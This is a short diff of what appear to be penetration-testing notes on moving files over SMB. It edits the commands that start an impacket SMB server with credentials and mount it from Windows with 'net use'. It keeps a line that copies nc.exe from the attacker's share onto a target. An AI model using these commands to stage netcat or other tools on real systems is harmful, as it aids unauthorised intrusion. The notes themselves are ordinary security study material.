@@ -55,11 +55,11 @@ copy \\192.168.220.133\share\nc.exe
 if unauthenticated error then give username and password while making server
 
 ```
-sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
+sudo impacket-smbserver share -smb2support . -user test -password test
 ```
 
 ```
-net use n: \\192.168.45.186\share /user:test test
+net use n: \\192.168.45.216\share /user:test test
 
 The command completed successfully.
 
